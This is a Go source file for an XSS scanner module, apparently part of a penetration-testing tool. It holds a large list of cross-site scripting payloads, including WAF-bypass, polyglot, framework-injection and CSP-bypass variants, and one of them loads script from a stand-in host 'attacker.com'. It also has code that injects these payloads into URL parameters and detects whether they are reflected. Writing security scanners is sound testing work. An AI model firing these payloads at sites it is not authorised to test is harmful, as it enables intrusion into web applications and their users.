package scanners

import (
	"regexp"
	"strings"
	"time"

	"penhunter/types"
)

type XSSScanner struct {
	*BaseScanner
	payloads []string
}

func NewXSSScanner(encoders []string) *XSSScanner {
	// Advanced XSS payloads for modern web applications
	payloads := []string{
		// Basic payloads
		`"><script>alert(123456)</script>`,
		`'><script>alert(123456)</script>`,
		`"><img src=x onerror=alert(123456)>`,
		`"><svg onload=alert(123456)>`,

		// Event handler bypasses
		`"><body onload=alert(123456)>`,
		`"><input onfocus=alert(123456) autofocus>`,
		`"><select onfocus=alert(123456) autofocus>`,
		`"><textarea onfocus=alert(123456) autofocus>`,
		`"><video><source onerror=alert(123456)>`,
		`"><audio src=x onerror=alert(123456)>`,
		`"><details open ontoggle=alert(123456)>`,
		`"><marquee onstart=alert(123456)>`,
		`"><object data=javascript:alert(123456)>`,

		// JavaScript protocol variations
		`javascript:alert(123456)`,
		`javascript:alert(123456)//`,
		`javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(123456)//'>`,

		// SVG-based payloads
		`"><svg/onload=alert(123456)>`,
		`<svg><animate onbegin=alert(123456) attributeName=x dur=1s>`,
		`<svg><set onbegin=alert(123456) attributename=x>`,
		`<svg><discard onbegin=alert(123456)>`,

		// Template literal and modern JS
		`${alert(123456)}`,
		`{{constructor.constructor('alert(123456)')()}}`,
		`[[${alert(123456)}]]`,

		// WAF bypass techniques
		`"><ScRiPt>alert(123456)</sCrIpT>`,
		`"><scr<script>ipt>alert(123456)</scr</script>ipt>`,
		`"><script>alert(String.fromCharCode(49,50,51,52,53,54))</script>`,
		`"><img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#50;&#51;&#52;&#53;&#54;&#41;">`,
		`"><img src=x onerror=\u0061\u006C\u0065\u0072\u0074(123456)>`,

		// DOM-based XSS payloads
		`#<script>alert(123456)</script>`,
		`?default=<script>alert(123456)</script>`,

		// Polyglot payloads
		`jaVasCript:/*-/*\x60/*\\\x60/*'/*"/**/(/* */oNcLiCk=alert(123456) )//`,
		`"><img src=x id=alert(123456) onerror=eval(id)>`,
		`'">><marquee><img src=x onerror=alert(123456)></marquee></marquee>`,

		// Encoding bypass
		`"><a href="javascript:alert(123456)">click</a>`,
		`"><iframe srcdoc="<script>alert(123456)</script>">`,
		`"><math><mtext><table><mglyph><style><img src=x onerror=alert(123456)>`,

		// Angular/Vue/React specific
		`{{$on.constructor('alert(123456)')()}}`,
		`<div ng-app ng-csp><textarea autofocus ng-focus="d=$event.view.document;d.location.hash.match('x]teleport') ?'':[].teleport.call(d.body,d.createElement('script')).src='//attacker.com'"></textarea></div>`,
		`[ng-click]="$event.target.ownerDocument.defaultView.alert(123456)"`,

		// CSP bypass attempts
		`"><base href="javascript:/a]x]=//-alert(123456)//">`,
		`"><link rel=import href="data:text/html,<script>alert(123456)</script>">`,

		// Mutation XSS (mXSS)
		`<noscript><p title="</noscript><script>alert(123456)</script>">`,
		`<listing>&lt;img src=1 onerror=alert(123456)&gt;</listing>`,
	}

	return &XSSScanner{
		BaseScanner: NewBaseScanner("XSS", "high", encoders),
		payloads:    payloads,
	}
}

func (s *XSSScanner) Payloads() []string {
	return s.payloads
}

// DetectWithPayload checks if the specific payload is reflected in response (reduces false positives)
func (s *XSSScanner) DetectWithPayload(resp *types.HttpResponse, payload string) bool {
	body := string(resp.Body)
	bodyLower := strings.ToLower(body)
	payloadLower := strings.ToLower(payload)

	// Check if our specific payload is reflected in the response
	if !strings.Contains(bodyLower, payloadLower) {
		// Payload not reflected at all - not vulnerable
		return false
	}

	// Check for specific XSS indicators that prove execution context
	// Only flag as vulnerable if payload appears in executable context

	// Check for script tag with our payload
	if strings.Contains(payload, "<script") && strings.Contains(body, payload) {
		// Verify it's not HTML encoded
		if !strings.Contains(body, "&lt;script") {
			return true
		}
	}

	// Check for event handlers with our payload
	eventHandlers := []string{"onerror=", "onload=", "onfocus=", "onclick=", "onmouseover=", "ontoggle="}
	for _, handler := range eventHandlers {
		if strings.Contains(payloadLower, handler) {
			// Check if reflected without encoding
			if strings.Contains(bodyLower, handler+"alert") || strings.Contains(bodyLower, handler+"'alert") {
				return true
			}
		}
	}

	// Check for javascript: protocol injection
	if strings.Contains(payloadLower, "javascript:") {
		if strings.Contains(bodyLower, "javascript:alert") {
			return true
		}
	}

	// Check for SVG/IMG payload reflection
	if strings.Contains(payloadLower, "<svg") || strings.Contains(payloadLower, "<img") {
		if strings.Contains(body, payload) && !strings.Contains(body, "&lt;svg") && !strings.Contains(body, "&lt;img") {
			return true
		}
	}

	return false
}

func (s *XSSScanner) Detect(resp *types.HttpResponse) bool {
	// This is a fallback - prefer DetectWithPayload for accuracy
	body := string(resp.Body)

	// Only check for very specific XSS patterns that indicate real vulnerabilities
	reflectionPatterns := []*regexp.Regexp{
		regexp.MustCompile(`(?i)<script[^>]*>\s*alert\s*\(\s*123456\s*\)\s*</script>`),
		regexp.MustCompile(`(?i)onerror\s*=\s*["']?\s*alert\s*\(\s*123456`),
		regexp.MustCompile(`(?i)onload\s*=\s*["']?\s*alert\s*\(\s*123456`),
	}

	for _, pattern := range reflectionPatterns {
		if pattern.MatchString(body) {
			return true
		}
	}

	return false
}

func (s *XSSScanner) Scan(targetURL string, client types.HttpClient) []*types.Finding {
	var findings []*types.Finding
	seenVulns := make(map[string]bool) // Prevent duplicate findings

	if !s.hasParameter(targetURL) {
		return findings
	}

	// Extract parameters
	params := s.extractParameters(targetURL)
	if len(params) == 0 {
		return findings
	}

	// Get baseline response to compare
	baselineResp, _ := client.Get(targetURL, nil)
	baselineBody := ""
	if baselineResp != nil {
		baselineBody = string(baselineResp.Body)
	}

	// Test each payload
	for _, payload := range s.payloads {
		// Get payload variants
		variants := s.mutatePayload(payload)

		for _, variant := range variants {
			// Test in each parameter
			for _, param := range params {
				parts := strings.SplitN(param, "=", 2)
				if len(parts) != 2 {
					continue
				}

				paramName := parts[0]

				// Skip if already found vuln for this param
				vulnKey := targetURL + "|" + paramName
				if seenVulns[vulnKey] {
					continue
				}

				injectedURL := s.injectPayload(targetURL, variant)

				// Make request
				resp, err := client.Get(injectedURL, nil)
				if err != nil {
					continue
				}

				// Skip if response is same as baseline (payload not processed)
				if string(resp.Body) == baselineBody {
					continue
				}

				// Use accurate detection with payload validation
				if s.DetectWithPayload(resp, variant) {
					evidence := s.extractEvidence(string(resp.Body), variant)
					confidence := s.calculateConfidence(resp, variant)

					// Only report high confidence findings
					if confidence >= 0.7 {
						finding := s.createFinding(
							injectedURL,
							paramName,
							variant,
							evidence,
							confidence,
							resp.StatusCode,
							string(resp.Body),
						)

						findings = append(findings, finding)
						seenVulns[vulnKey] = true
					}
				}

				time.Sleep(50 * time.Millisecond)
			}
		}
	}

	return findings
}

func (s *XSSScanner) extractEvidence(body, payload string) string {
	// Find where payload appears in response
	idx := strings.Index(strings.ToLower(body), strings.ToLower(payload))
	if idx == -1 {
		return "Payload reflected in response"
	}

	start := idx - 50
	if start < 0 {
		start = 0
	}

	end := idx + len(payload) + 50
	if end > len(body) {
		end = len(body)
	}

	return body[start:end]
}

func (s *XSSScanner) calculateConfidence(resp *types.HttpResponse, payload string) float64 {
	body := strings.ToLower(string(resp.Body))
	payloadLower := strings.ToLower(payload)

	confidence := 0.5

	// Exact match
	if strings.Contains(body, payloadLower) {
		confidence += 0.3
	}

	// Script tag execution
	if strings.Contains(body, "<script") && strings.Contains(body, "alert") {
		confidence += 0.2
	}

	// Status code
	if resp.StatusCode == 200 {
		confidence += 0.1
	}

	if confidence > 1.0 {
		confidence = 1.0
	}

	return confidence
}
